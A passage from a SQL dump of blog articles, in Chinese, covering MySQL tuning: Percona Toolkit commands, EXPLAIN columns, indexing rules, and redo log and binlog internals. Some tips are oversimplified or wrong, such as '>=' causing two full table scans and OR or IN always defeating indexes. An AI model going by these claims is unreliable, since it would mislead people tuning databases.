mysql;\n(2) select user,host ,plugin from mysql.user where user=\'root\'; // perconaToolkit3.2.1不支持caching_sha2_password\n(3) alter user root@\'localhost\' identified  with mysql_native_password by \'mysqlpassword\'; // 让mysql支持percona的身份验证插件\n// 查看mysql的死锁信息,在test库中建立一张deadlocks表,用于记录死锁信息\npt-deadlock-logger --run-time=10 --interval=3 --create-dest-table --dest D=test,t=deadlocks u=root,p=mysqlpassword\n// 从慢查询日志中分析索引使用情况\npt-index-usage --user=root --password=mysqlpassword --host=localhost /var/lib/mysql/izwz9hiye4lft7f85poremz-slow.log\n// 从慢查找数据库表中重复的索引\npt-duplicate-key-checker --host=localhost --user=root --password=mysqlpassword\n// 查看mysql表和文件的当前活动IO开销(不要在高峰时使用)\npt-ioprofile\n// 查看不同mysql配置文件的差异(集群常用,双方都生效的变量)\npt-config-diff /etc/my.cnf /root/my_master.cnf\n// 查找数据库里大于1M的表\npt-find --user=root --password=mysqlpassword --tablesize +1M\n// 查找表和索引大小并排序\npt-find --user=root --password=mysqlpassword --printf \"%T\\t%D.%N\\n\" | sort -rn\n// 杀掉显示查询时间大于3秒的查询,--print仅为打印,--kill为杀死\npt-kill --user=root --password=mysqlpassword --busy-time 3 --print(打印) --kill(杀死)\n// 查看mysql授权(集群常用,授权复制) 示例如下\npt-show-grants --user=root --password=mysqlpassword\npt-show-grants --user=root --password=mysqlpassword --separate --revoke\n// 验证数据库复制的完整性(集群常用,主从复制后校验),示例如下\npt-table-checksum --user=root --password=mysqlpassword\n\n// pt-query-digest排除有问题的SQL\n// (1) 查询次数多且每次查询占用时间长的sql\n通常为pt-query-digest分析的前几个查询,该工具可以很清楚的看出每个SQL执行的次数及百分比等信息,执行的次数多,占比较大的SQL\n// (2) IO大的sql\n注意pt-query-digest分析中的Rows examine项,扫描的行数越多,IO越大\n// (3) 未命中的索引sql\npt-query-digest分析中的Rows examine(检测的数据)和Rows Send(真正发给客户端的数据)的对比。如果相差较大,说明该SQL的索引命中率不高,对于这种SQL,我们要重点进行关注\n```\n### 执行计划\n```java\n// 执行计划\nSQL的执行计划反映出SQL的执行效率,在执行的SQL前面加上explain即可,如 explain select * from actor;\n官方文档 https://dev.mysql.com/doc/refman/8.0/en/explain-output.html\n\n// id\n数字越大越先执行,如果数字一样大,那么就从上往下执行,id列为null就表示这是一个结果集,不需要使用它来查询\n// select_type\nsimple: 表示不需要union操作或者不包含子查询的简单select查询,有连接查询时,外层的查询为simple,其只有一个\nprimary: 一个需要union操作或者含有子查询的select,位于最外层的查询,select_type即为primary,且只有一个\nunion: union连接的两个select查询,第一个查询时dervied派生表,除第一个表外,第二个以后的表select_type都是union\nunion result: 包含union的结果集,在union和union all语句中,因此它不需要参与查询,所有id字段为null\ndependent union: 与union一样,出现在union或union all语句中,但是这个查询要受到外部查询的影响,比如where in\nsubquery: 除了from字句中包含的子查询外,其他地方出现的子查询都可能是subquery\ndependent subquery: 与dependent union类似,表示这个subquery的查询要受到外部表查询的影响\nderived: from字句中出现的子查询,也叫做派生表,其他数据库中可能叫做内联视图或嵌套select\nmaterialization: 物化子查询通过将子查询结果作为一个临时表来加快查询执行速度,正常来说是常驻内存,下次查询会再次引用临时表\n\n// table\n显示的查询表名,如果查询使用了别名,那么这里显示的是别名,如果不涉及对数据表的操作,那么这里显示为null,如果显示为尖括号括起来的<derived N>就表示这个是临时表\n后边的N就是执行计划中的id,表示结果来自于这个查询产生.如果是尖括号括起来的<union M,N>,与<derived N>类似,也是一个临时表,表示这个结果来自于union查询的id为M,N结果集\n// type,好的索引至少达到range,最好达到ref\nsystem: 表中只有一行数据或者空表,且只能用于myisam和memory表,如果是innodb引擎表,type列在这个情况通常都是all或者index\nconst: 使用*唯一索引或者主键*,返回记录一定是*一行记录的等值*where条件时,通常type是const,其他数据库也叫做唯一索引扫描\neq_ref: 出现在要连接多个表的查询计划中,驱动表循环获取数据,这行数据是第二个表的主键或者唯一索引,作为条件查询只返回*一条数据*,且必须为not null,唯一索引和主键是多列时,只有所有的列都用作比较时才会出现eq_ref\nref: 不像eq_ref那样要求连接顺序,也没有主键和唯一索引的要求,只要使用相等条件检索时就可能出现,常见与辅助索引的等值查找或者多列主键、唯一索引中,使用第一个列之外的列作为等值查找也会出现,总之,返回数据*不唯一的等值*查找就可能出现\nfulltext: 全文索引检索,全文索引的优先级很高,若全文索引和普通索引同时存在时,mysql不管代价,优先选择使用全文索引 ft_idx_t1_nickname_remark\nref_or_null: 与ref方法类似,只是增加了null值的比较,实际用的不多\nunique_subquery: 用于where中的in形式子查询,子查询返回不重复唯一值\nindex_subquery: 用于in形式子查询使用到了辅助索引或者in常数列表,子查询可能返回重复值,可能使用索引将子查询去重\nrange: 索引范围扫描,常见于使用>,<,is null,between,in,like等运算符的查询中\nindex_merge: 表示查询使用了两个以上的索引,最后取交集或者并集,常见于and,or的条件使用了不同的索引,\n			官方排序这个在ref_or_null之后,但是实际上由于要读取多个索引,性能可能大部分时间都不如range\nindex: 索引全表扫描,把索引从头到尾扫一遍,常见于使用索引列就可以处理不需要读取数据文件的查询、可以使用索引排序或者分组的查询,换句话说,所有的数据就在索引里,不需要回表\nall: 这个就是全表扫描数据文件,然后再在server层进行过滤返回符合要求的记录\n\n// possible_keys\n查询可能使用到的索引\n\n// key\n查询真正使用到的索引,select_type为index_merge时,这里可能出现两个以上的索引,其他的select_type这里只会出现一个\n\n// key_len\n用于处理查询的索引长度,如果是单列索引,那就是整个索引长度,如果是多列索引,那么查询不一定都能使用到所有的列,具体使用到了多少个列的索引,这里就会计算进去,没有使用的列不会计算进去。留一下这个值,算一下你的多列索引总长度就知道有没有使用到所有的列了。另外,key_len只计算where条件用到的长度,而排序和分组就算用到了索引,也不会计算到key_len中\n\n// ref\n如果是使用的常数等值查询,这里会显示const,如果是连接查询,被驱动表的执行计划这里会显示驱动表的关联字段,如果是条件,使用了表达式或者函数,或者条件列发生了内部隐式转换,这里可能显示为func\n\n// rows\n这里是执行计划中估算的扫描行数,不是精确值\n\n// extra\nno tables used: 不带from字句的查询或者from dual查询\nNULL: 查询的列未被索引覆盖,并且where筛选条件是索引的前导列(where条件字段复合索引连续连起来的索引),意味着用到了索引,但是部分字段未被索引覆盖,必须通过\"回表\"来实现,不是纯粹的用到了索引,也不是完全没用到索引\nusing index: 查询时不需要回表查询,直接通过索引就可以获取到查询的数据\nusing where: 查询的列未被索引覆盖,where筛选条件*非索引*的前导列\nusing where using index: 查询的列被索引覆盖,并且where筛选条件是索引列之一但是*不是索引的前导列*,意味着无法直接通过索引查找来查询到符合条件的数据\nusing index condition: 与using where类似,查询的列不完全被索引覆盖,where条件中是一个前导列的范围\nusing temporary: 表示使用了*临时表存储中间结果*比如select distinct。临时表可以是内存临时表和磁盘临时表,执行计划中看不出来,需要查看status变量,used_tmp_table,used_tmp_disk_table才能看出来\nusing filesort: mysql会对结果使用一个外部索引排序(外部临时文件),而不是按索引次序从表里读取行,此时mysql会根据联接类型浏览所有符合条件的记录,并保存排序关键字和行指针,然后排序关键字并按顺序检索行信息。这种情况下一般也是要考虑使用索引来优化的。\nusing intersect: 表示使用and的各个索引的条件时,该信息表示从处理结果获取交集\nusing union: 表示使用or连接各个使用索引的条件时,该信息表示从处理结果获取并集\nusing sort_union和using sort_intersection: 用and和or查询信息量大时,先查询主键,然后进行排序合并后返回结果集\nfirstmatch(tb_name): 5.6.x开始引入的优化子查询的新特性之一,常见于where字句含有in()类型的子查询,如果内表的数据量比较大的,就可能出现这个\nloosescan(m..n): 5.6.x之后引入的优化子查询的新特性之一,在in()类型的子查询中,子查询返回的可能有重复记录时,就可能出现这个\n\n// filtered\nfiltered: 使用explain extended时会出现这个列,5.7之后的版本默认就有这个字段,不需要使用explain extended了。这个字段表示存储引擎返回的数据在server层过滤后,剩下多少满足查询的记录数量比例,注意是百分比,不是具体记录数\n```\n### 基本优化\n#### 数据库结构优化\n```java\n// 表范式化原则\n范式化是指数据库设计的规范,目前范式化一般是指设计到第三范式,也就是要求数据表中不存在非关键字字段对任意候选关键字段的传递函数依赖,则符合第三范式\n// 反范式化原则\n反范式化原则是指为了查询效率的考虑把原本符合第三范式的表,\"适当\"的增加冗余,已达到优化查询的目的,反范式化是一种已空间换取时间的操作\n// 垂直拆分原则\n(1) 不常用的字段单独存放到一个表\n(2) 大字段独立存放到一个表\n(3) 经常一起使用的字段放到一起 \n\n```\n#### 索引\n```java\n// 索引种类\nB-tree索引: mysql中使用最频繁的索引类型\nHash索引: 检索效率远高于B-tree索引,可以一次定位,但使用范围窄且苛刻\nFulltext索引: 目前仅char,varchar,text这三种类型可以\nR-tree索引: 比较少见,主要用于空间数据检索\n\n// 如何判断是否需要创建索引\n(1) 较频繁的作为查询条件的字段应该创建索引\n(2) 唯一性太差的字段不适合单独创建索引,但可以尝试复合索引\n(3) 更新非常频繁的字段不适合创建索引\n(4) 不会出现在where子句中的字段不该创建索引\n\n// 索引失效原因\n(1) 复合索引尽量全匹配\n(2) 最佳左前缀法则(带头索引不能死,中间索引不能断)\n(3) 不要在索引上做任何操作(计算,函数,自动/手动类型转换),不然会导致索引失效而转向全表扫描\n(4) mysql存储引擎不能继续使用索引中范围条件(bettween < > in 等)右边的列\n(5) 尽量使用覆盖索引(只查询索引的列(索引列和查询列一致)),减少select *\n(6) 索引字段上使用(!=或者<>)判断时,会导致索引失效而转向全表扫描\n(7) 索引字段上使用is null/is not null判断时,会导致索引失效而转向全表扫描(mysql8可能不会失效)\n(8) 索引字段使用like已通配符开头(\'%字段串\')时,会导致索引失效而转向全表扫描\n(9) 索引字段时字符串,但查询时不加单引号,会导致索引失效而转向全表扫描\n(10) 索引字段使用or时,会导致索引失效而转向全表扫描\n\n```\n#### 优化原则\n```java\n(1) 不在数据库做运算,运算务必移至业务层.针对百万数量级,放弃在mysql中的join操作,推荐分别根据索引单表取数据,然后在程序里面做join,merge数据\n(2) 读IO尽量使用nosql,例如redis,memcacheed等缓存热点数据,写IO用消息队列慢慢依次操作,防止mysql达到3500qps后宕机\n(3) 库命名简洁明确(长度不能超过30个字符)\n(4) 控制列数量(字段少而精,字段数建议在20以内)\n(5) 平衡范式与冗余(效率优先,往往牺牲范式)\n(6) 拒绝3B(拒绝大sql语句,拒绝大事务,拒绝大批量)\n(7) 用好数值类型(用合适的字段类型节约空间)\n(8) 字符转化为数字(能转化的最好转化,同样节约空间,提高查询性能)\n(9) 避免使用null字段(null字段很难查询优化,null字段的索引需要额外空间,null字段的复合索引无效)\n(10) 少用text类型(尽量使用varchar代替text字段)\n(11) 合理使用索引(改善查询,减慢更新,索引一定不是越多越好)\n(12) 字符字段建前缀索引(例如: asss,bsss,csss)只要前面3个,如身份证的区域编码 \n(13) 不在索引做列运算(例如: select * from t1 where id + 1= 10)\n(14) innodb主键推荐使用自增列(因为自增不容易造成索引碎片)(主键建立聚簇索引,主键不应该被修改.字符串不应该做主键),不用物理外键(由程序保证约束逻辑外键)\n(15) sql语句尽可能简单(一条sql只能在一个cpu运算,大语句拆小语句,减少锁时间,一个大sql可以堵死整个库)\n(16) 简单的事务(如果可以,最好是不要有事务)\n(17) 避免使用trig/func(不用触发器,函数。客户端程序取而代之)\n(18) 不用select * ,消耗cpu,io,内存,带宽,这种程序不具有扩展性\n(19) OR改写为IN (在字段没有索引的情况下性能差别较大)\n(20) OR改写为UNION (索引无效变有效)\n	- select id,name from t1 where name=\'A\' OR nickname=\'A\' # OR效率低\n	- select id,name from t1 where name=\'A\' UNION ALL select id,name from t1 where nickname=\'A\' # UNION ALL效率高\n(21) 使用union all替代union,union有去重开销\n(22) 少用连接join(超过3个join,一般移到业务代码里执行)\n(23) 分页limit优化(偏移量越大,执行越慢)\n	- select * from t1 limit 90000,20; # 效率低\n	- select * from t1 where id IN (select id from t1 where id > 90000) limit 0,20; # 效率高,但需保证id是递增的\n```\n### 慢查询优化\n#### 慢查询优化思路\n```java\n// 慢查询优化思路\n(1) 优化更需要优化的SQL,次数多且io少的sql,减少更多的io\n(2) 定位优化对象的性能瓶颈,是因为数据访问原因还是io消耗的原因,是索引还是全表扫描\n(3) 明确的优化目标,优化到什么程度,什么状态\n(4) 从explain执行计划入手\n(5) *永远用小结果集驱动大的结果集*,join外层嵌套的for循环一定要小\n(6) 尽可能在索引中完成排序\n(7) 只取出自己需要的列,不要用select *\n(8) 仅使用最有效的过滤条件\n(9) 尽可能避免复杂的join和子查询\n(10) 小心使用order by,group by,distinct语句\n(11) 合理设计并利用索引\n(12) 使用索引时,不要使用like\'%\'通配符开头,否则会全表扫描\n(13) 使用OR,条件都必须加上索引,只要有一个条件不加索引,就不会使用索引\n(14) IS NULL会使用索引,=NULL不会使用索引\n(15) 使用GROUP BY分组不会使用索引,ORDER BY NULL可以禁止GROUP BY的排序\n(16) 不要使用>=,会做两次全表扫描,直接使用>\n(17) IN和NOT IN要慎用,否则会全表扫描.用between和exists代替IN\n(18) 尽量使用连接代替子查询,子查询会造成额外的内存使用,表的数据级较大不要使用join,而是在程序中单表查询\n(19) 查询量非常大时,使用缓存,分表,分页\n\n```\n#### 永远用小结果集驱动大的结果集(join操作表小于百万级别,否则在程序中拆分进行单表查询)\n```java\n// 驱动表的定义,结果集少的表为驱动表\n// 当进行多表连接查询时,[驱动表]的定义为:\n(1) 指定了联接条件时,满足查询条件的记录行数少的表为[驱动表]\n(2) 未指定联接条件时,行数少的表为[驱动表]\n\n// mysql关联查询的概念\n(1) mysql表关联的算法是nest loop join,是通过驱动表的结果集作为循环基础数据,\n然后一条条地通过该结果集中的数据作为过滤条件到下一个表中查询数据,最后合并结果\n\n// left join,right join,inner join的区别\n(1) left join: A表作为驱动表的数据全部展现,B表被驱动表展现满足条件的,不属于A表的数据字段数据结果全部用null填充\n(2) right join: B表作为驱动表的数据全部展现,A表被驱动表展现满足条件的,不属于B的数据字段数据结果全部用null填充\n(3) inner join: A表与B表都只显示满足条件的,由mysql决定使用谁作为驱动表,相当于select * from t2,t3\n\n// join的实现原理\n// mysql只支持一种join算法\nNest-Loop Join(嵌套循环连接)\n// 但Nested-Loop Join有三种变种\nSimple Nested-Loop Join(简单嵌套循环)\nIndex Nested-Loop Join(索引嵌套循环)\nBlock Nested-Loop Join(块嵌套循环,在简单循环的基础上增加了一个joinBuffer减少循环的次数),分批进行循环取出,减少次数\n\n// join的优化思路\n(1) 尽可能减少join语句中的Nested Loop的循环总次数,让驱动表的结果集尽可能的小\n(2) 优先优化Nested Loop的内层循环,比如驱动表加入索引\n(3) 保证join语句中被驱动表上join条件字段已经被索引\n(4) 无法保证被驱动表的join条件字段被索引且内存资源充足的前提下,不要太吝惜joinBuffer的设置\n\n// join的优化思路总结\n(1) 并发量太高的时候,系统整体性能可能会急剧下降,超过三张表不要使用join,否则join锁的资源过多,表的数据级较大不要使用join,而是在程序中单表查询\n(2) 复杂的join语句,所需要锁定的资源也就越多,所阻塞的其他线程也就越多\n(3) 复杂的query语句分拆成多个较为简单的query语句分布执行\n```\n\n#### 只取出需要的列,不要用select *\n```java\n(1) 如果取出的列过多,则传输给客户端的数据量必然很大,浪费带宽\n(2) 若在排序的时候输出过多的列,则会浪费内存\n(3) 若在排序的时候输出过多的列,还有可能改变执行计划\n```\n\n#### 仅使用最有效的过滤条件\n```java\n(1) where字句中条件越多越好吗\n(2) 若在多种条件下都使用了索引,那如何选择\n(3) 最终选择方案: key_length的长度决定使用哪个条件,长度越小越好\n```\n\n#### 尽可能在索引中完成排序\n```java\n(1) order by 字句中的字段加索引(扫描索引即可,内存中完成,逻辑IO)\n(2) 若不加索引的话可能会启用一个临时文件辅助排序(导致落盘,物理IO)\n(1) order by排序可利用索引进行优化,order by子句中只要是索引的*前导列*都可以使索引生效,可以直接在索引中排序,不需要在额外的内存或者文件中排序\n(2) 不能利用索引避免额外排序的情况,例如:排序字段中有多个索引,排序顺序和索引键顺序不一致(非联合索引前导列)\n(3) order by排序算法\n- mysql对于不能利用索引避免排序的sql,数据库不得不自己实现排序功能以满足用户需求,此时sql的执行计划中会出现\"Using filesort\",\n- 这里需要注意的是filesort并不意味着就是文件排序,其实也有可能是内存排序,这个主要由sort_buffer_size和read_rnd_buffer_size参数与结果集大小确定。\n- mysql内部实现排序主要有三种方式,常规排序,优化排序和优先队列排序,主要涉及三种排序算法:快速,归并,堆排序\n- 由于mysql5.6针对limit M,N语句采用了优先队列,优先队列采用了堆排序,但是堆排序是不稳定的,会导致分页数据重复,为了避免这个问题,需要在排序中加入唯一值,如order by id\n```\n#### group by分组优化思想\n```java\n(1) group by本质上也同样需要进行排序操作(mysql8优化了,默认不排序了),而且与orderby相比,groupby主要只是多了排序之后的分组操作。如果在分组的时候还使用了其他的一些聚合函数,那么还需要一些聚合函数的计算，所以,在groupby的实现过程中,与groupby一样也可以利用到索引,比如group by联合索引\n(2) 三种实现类型\n- Loose Index Scan(松散的索引扫描)\n- Tight Index Scan(紧凑的索引扫描)\n- Using temporary 临时表实现(非索引实现)\n```\n\n#### distinct的实现及优化思路\n```java\n(1) distinct原理\n- distinct实际上和groupby的操作非常相似,在groupby之后的每组中只取出一条记录而已。\n- 所以,distinct的实现和groupby的实现也基本不多同样可以通过松散索引扫描或者紧凑索引扫描来实现,当然,在无法仅仅使用索引既能完成distinct的时候,mysql只能通过临时表来完成\n- 但是和groupby有差别的是,distinct并不需要排序\n(2) distinct的等值查询与范围查询\n- explain select distinct name from t1 where idc = 3\\G # 索引中完成,索引默认是排好序的\n- explain select distinct name from t1 where idc > 3\\G # 非索引中完成,暗藏排序问题,因为是范围查询需要临时表排序\n```', 0, 0, 49, 0, 0, '2021-04-16 16:35:22', '2021-04-16 16:35:22', 0, 0);
INSERT INTO `article` VALUES (112, 1, 'mysql的redolog binlog以及undolog', '2019/9/1568441326_mmexport1568440947604.jpg', '### 数据更新的基本流程\n![Mysql的提交事务流程.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625661084_Mysql的提交事务流程.png)\n```java\n// 提交事务更新的大致流程\n(1)执行提交事务更新语句\n(2)从磁盘数据文件中将数据加载到BufferPool中,注意,如果BufferPool中如果有这个更新数据的话,那么不会执行此步,不会从磁盘文件中获取,而是直接使用BufferPool中的数据\n(3)向undolog日志文件写入该更新数据的旧值信息,便于回滚\n(4)更新BufferPool中的这条更新数据,不需要连带着更新到磁盘中\n(5)向内存的redolog buffer中写入这条更新数据的redolog日志\n(6)将redolog buffer中这条数据同步更新到磁盘的redolog日志文件中\n(7)写入该更新数据的binlog数据到磁盘文件的binlog日志文件中\n(8)向磁盘redolog日志文件更新关联该更新对应的binlog日志数据并把该数据的写入状态改为commit\n\n// 刷脏数据并更新磁盘\n更新数据并不会立刻持久化数据到磁盘的数据页中而是更新bufferPool的缓存页数据,这是为了IO性能效率考虑\nmysql后台有io线程会不断从bufferPool获取脏数据(未更新到磁盘的数据)持久化到磁盘数据文件中\n```\n### redo log\n#### 两阶段提交\n![mysqlredolog两阶段提交.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625235731_mysql-redolog-两阶段提交.png)\n```java\n// 两阶段提交\n有了 redo log，InnoDB 可以保证即使数据库发生异常宕机重启，之前提交的记录也不会丢失，这个能力称为 crash-safe。\n(1) 执行器先找引擎取 ID=1 这一行。ID 是主键，引擎直接用树搜索找到这一行。\n如果 ID=1 这一行所在的数据页本来就在内存存储中，就直接返回给执行器；否则，需要先从磁盘读入内存，然后再返回。\n(2) 执行器拿到引擎给的行数据，把这个值加上 1，比如原来是 N，现在就是 N+1，得到新的一行数据，再调用引擎接口写入这行新数据。\n(3) 引擎将这行新数据更新到内存存储中，同时将这个更新操作记录到 redo log 里面，此时 redo log 中这条数据处于 prepare 状态。然后告知执行器执行完成了，随时可以提交事务。\n(4) 执行器生成这个操作的 binlog，并把 binlog 写入磁盘。\n(5) 执行器调用引擎的提交事务接口，引擎把刚刚写入的 redo log 中这条数据改成提交（commit）状态，更新完成。\nredo log 将写入拆成了两个步骤：prepare 和 commit，这就是\"两阶段提交\"\n两阶段提交是为了让两份日志之间的逻辑一致,防止因为mysql宕机而导致日志逻辑不一致,导致数据不一致\n\n// 宕机处理\n// redo log 处于 prepare后宕机,未写入binlog,事务回滚\n写入 redo log 处于 prepare 阶段之后、写 binlog 之前，发生了崩溃（crash），\n由于此时 binlog 还没写，redo log 也还没提交，所以崩溃恢复的时候，这个事务会回滚。binlog 还没写，所以也不会传到备库。\n// binlog 写完，redo log 还没 commit 前发生宕机\n如果 redo log 里面的事务是完整的，也就是已经有了 commit 标识，则直接提交；\n如果 redo log 里面的事务只有完整的 prepare，则判断对应的事务 binlog 是否存在并完整：如果是则提交事务,否则回滚事务。\nbinlog 完整写完以后 MySQL 发生崩溃，这时候 binlog 已经写入了，会被从库（或者用这个 binlog 恢复出来的库）使用。\n所以redo log处于prepare 阶段,binlog完整的话就一定要提交,否则就会导致主从库中的数据不一致\n\n// XID,redo log 和 binlog 关联起来\nstatement 格式的 binlog写完，最后会有 COMMIT；\nrow 格式的 binlog写完，最后会有一个 XID event。\n通过这两个标识,认为binlog是否是完整的\nredo log 和 binlog有一个共同的数据字段，叫 XID。崩溃恢复的时候，会按顺序扫描 redo log：\n(1) 如果碰到既有 prepare、又有 commit 的 redo log，就直接提交；\n(2) 如果碰到只有 parepare、而没有 commit 的 redo log，就拿着 XID 去 binlog 找对应的事务。\n\n// redo log存储格式\nredo log里本质上记录的就是在对某个表空间的某个数据页的某个偏移量的地方修改了几个字节的值，具体修改的值是什么，他里面需要记录的就是表空间号+数据页号+偏移量+修改几个字节的值+具体的值\n根据修改了数据页里的几个字节的值，redo log就划分为了不同的类型，MLOG_1BYTE类型的日志指的就是修改了1个字节的值，MLOG_2BYTE类型的日志指的就是修改了2个字节的值，以此类推，还有修改了4个字节的值的日志类型，修改了8个字节的值的日志类型。\n要是一下子修改了一大串的值，类型就是MLOG_WRITE_STRING，就是代表你一下子在那个数据页的某个偏移量的位置插入或者修改了一大串的值。\n一条redo log看起来大致的结构如下所示：\n日志类型（类似MLOG_1BYTE之类的），表空间ID，数据页号，数据页中的偏移量，具体修改的数据\n如果是MLOG_WRITE_STRING类型的日志，因为不知道具体修改了多少字节的数据，所以其实会多一个修改数据长度，就告诉你他这次修改了多少字节的数据，如下所示他的格式：\n日志类型（就是类似MLOG_1BYTE之类的），表空间ID，数据页号，数据页中的偏移量，修改数据长度，具体修改的数据\n这条redo log表达的语义就很明确了，他的类型是什么，类型就告诉了你他这次增删改操作修改了多少字节的数据；\n在哪个表空间里操作的，这个就是跟你SQL在哪个表里执行的是对应的；接着就是在这个表空间的哪个数据页里执行的，在数据页的哪个偏移量开始执行的，具体更新的数据是哪些呢。\n有了上述信息，就可以精准完美的还原出来一次数据增删改操作做的变动了。\n\n// 双 1 配置\ninnodb_flush_log_at_trx_commit 这个参数设置为 1,表示每次事务的 redo log 都直接持久化到磁盘。这样可以保证mysql异常重启之后数据不丢失\nsync_binlog 这个参数设置成为 1，表示每次事务的 binlog 都持久化到磁盘。这样可以保证mysql异常重启之后 binlog 不丢失。\nMySQL 的\"双 1\"配置，指的就是 sync_binlog 和 innodb_flush_log_at_trx_commit 都设置成 1\n表示一个事务完整提交前，需要等待两次持久化刷盘，一次是 redo log（prepare 阶段），一次是 binlog\n\n```\n#### redo log block与redo log buffer\n![Mysqlredologblock.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625734116_Mysql-redologblock.png)\n![Mysqlredologbuffer.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625734116_Mysql-redologbuffer.png)\n```java\n// redo log block\nmysql内有一个数据结构，叫做redo log block\n对于redo log也不是单行单行的写入日志文件的，他是用一个redo log block来存放多个单行日志的。\n一个redo log block是512字节，这个redo log block的512字节分为3个部分。\n一个是12字节的header块头，一个是496字节的body块体，一个是4字节的trailer块尾\n12字节的header头又分为了4个部分。\n(1) 包括4个字节的block no，块唯一编号；\n(2) 2个字节的data length，block里写入了多少字节数据；\n(3) 2个字节的first record group。每个事务都会有多个redo log，是一个redo log group，即一组redo log。那么在这个block里的第一组redo log的偏移量，就是这2个字节存储的；\n(4) 4个字节的checkpoint on\n\nredo log是不停的追加写入到redo log磁盘文件里去的。\n每一个redo log都是写入到文件里的一个redo log block里。\n内存里的一个redo log block的512字节都满了，再一次性把这个redo log block写入磁盘文件\n一个redo log block就是512字节，真正写入的时候，把这个redo log block的512字节的数据，写入到磁盘的redo log文件里去,那么磁盘的redo log文件里就多了一个block\n\n// 磁盘的顺序写与随机写\n如果依次在磁盘文件里的末尾追加不停的写字节数据，就是磁盘顺序写；\n但假设现在磁盘文件里已经有很多很多的redo log block了，此时要在磁盘里某个随机位置找到一个redo log block去修改他里面几个字节的数据，这就是磁盘随机写。\n\n// redo log buffer\nredo log是如何通过内存缓冲之后，再进入磁盘文件里去的，这就涉及到了一个新的组件，redo log buffer。\nredo log buffer是mysql专门设计了用来缓冲redo log写入的。\nredo log buffer是mysql在启动的时候，就向操作系统申请的一块连续内存空间。\nredo log buffer里面划分出了N多个空的redo log block\n通过设置mysql的 innodb_log_buffer_size 参数,可以指定这个redo log buffer的大小，默认的值是16MB，其实已经够大了，毕竟一个redo log block才512字节而已，每一条redo log其实也就几个字节到几十个字节罢了。\n\nredo log都是先写入内存里的redo log block数据结构里去的，然后完事儿了才会把redo log block写入到磁盘文件里去的\n当要写一条redo log的时候，就会先从第一个redo log block开始写入\n写满了一个redo log block，就会继续写下一个redo log block，以此类推，直到所有的redo log block都写满。\n如果redo log buffer里所有的redo log block都写满了,此时会强制把redo log block刷入到磁盘中去\n\n平时执行一个事务的过程中，每个事务会有多个增删改操作，那么就会有多个redo log。\n这多个redo log是一组redo log，每次一组redo log都是先在别的地方暂存，然后都执行完了，再把一组redo log给写入到redo log buffer的block里去的。\n如果一组redo log实在太多了，那么就可能会存放在两个redo log block中。\n但是反之，如果说一组redo log比较小，那么也可能多个redo log组是在一个redo log block里。\n\n// 循环覆盖写入\n平时不停的执行增删改，那么mysql会不停的产生大量的redo log写入日志文件。\n日志文件就用一个写入全部的redo log,会对磁盘占用空间越来越大\nredo log都会写入一个目录中的文件里，这个目录可以通过show variables like \'datadir\'来查看，可以通过innodb_log_group_home_dir 参数来设置这个目录的。\nredo log是有多个的，写满了一个就会写下一个redo log，而且可以限制redo log文件的数量，通过innodb_log_file_size可以指定每个redo log文件的大小，默认是48MB。\n通过 innodb_log_files_in_group 可以指定redo log日志文件的数量，默认就2个。\n所以默认情况下，目录里就两个日志文件，分别为ib_logfile0和ib_logfile1，每个48MB,最多就这2个日志文件。\n先写第一个，写满了写第二个。那么如果第二个也写满了,将里面的内容刷入磁盘后，继续写第一个，覆盖第一个日志文件里原来的redo log\n```\n#### redo log的WAL机制\n![Mysqlredologredolog结构.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625322835_Mysql-redolog-redolog结构.png)\n```java\n// redo log buffer不需要每次都持久化刷入到硬盘\nredo log buffer 里面的内容，并不是每次都要直接持久化到磁盘\n如果事务执行期间 MySQL 发生异常重启，那这部分日志就丢了。\n由于事务并没有提交，所以这时日志丢了也不会有损失。\n\n// WAL\nmysql中,如果每一次更新操作的commit时候,redo log都需要写进磁盘,在磁盘中找到对应的redo log那条记录并更新\n这样的话整个过程IO成本和查找成本会非常高\nredo log运用了一种WAL技术,WAL 的全称是 Write-Ahead Logging，\n它的关键点是更新数据时先写日志,等mysql不繁忙时再写磁盘\nredo log是innoDB存储引擎特有的,并不是mysql的Server层提供的\n\n// WAL过程\n当有一条记录需要更新时, innoDB 引擎会先把记录写道redo log中,更新内存中的数据,这个时候更新操作就算完成了,并没有写磁盘。\ninnoDB 引擎会在系统空闲的时候,将redo log这个操作记录更新到磁盘中\nInnoDB 的 redo log 是固定大小的，比如配置为一组 6 个文件，\n每个文件的大小是 1GB，那么redo log就可以记录 6GB 的操作。\n如果redo log日志的数据并不多,那么会等mysql空闲的时候进行处理\n如果redo log的存储空间满了,mysql会停止其他的操作,将redo log的一部分数据更新到磁盘中并将这部分数据从redo log删除擦除,已腾出存储空间\n写redo log的时候会从头开始写，写到末尾就又回到开头,进行循环写。\nwrite pos: 当前记录的位置，一边写一边进行后移,写到第 5 号文件的末尾后又会回到 0 号文件的开头。\ncheckpoint: 当前要擦除的位置,也是往后推移并且循环的，擦除记录前一定会把记录更新到磁盘当中。\nwrite pos 和 checkpoint 之间还空着的部分，是可以用来记录新的操作。\n如果 write pos 追上 checkpoint，表示redo log满了，这时候不能再执行新的更新，必须得停下来先擦掉一些记录，把 checkpoint 推进一下。\n```\n#### redo log buffer写入磁盘策略与时机\n![Mysqlredologbuffer写入状态.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1625411220_Mysql-redologbuffer写入状态.png)\n```java\n// redo log buffer刷入磁盘策略\n(1) 数据存在 redo log buffer 中，物理上是在 MySQL 进程内存中，就是图中的红色部分\n(2) 写到磁盘 (write)但是没有持久化（fsync)，物理上是在文件系统的 page cache 里面，也就是图中的黄色部分；\n(3) 持久化到磁盘，对应的是 hard disk，也就是图中的绿色部分\n日志写到 redo log buffer 是很快的，wirte 写到 page cache 也很快，但是持久化到磁盘的速度就很慢了。\n// 写入策略\n为了控制 redo log 的写入策略，InnoDB 提供了innodb_flush_log_at_trx_commit 参数，它有三种可能取值：\n(1)设置为 0 的时候，表示每次事务提交时都只是把 redo log 留在 redo log buffer 中 ;\n(2)设置为 1 的时候，表示每次事务提交时都将 redo log 直接持久化到磁盘；\n(3)设置为 2 的时候，表示每次事务提交时都只是把 redo log 写到 page cache。\n\n// redo log buffer刷入磁盘时机\nredo log在写的时候，都是一个事务里的一组redo log，先暂存在一个地方，完事儿了以后把一组redo log写入redo log buffer。\n写入redo log buffer的时候，是写入里面提前划分好的一个一个的redo log block的，选择有空闲空间的redo log 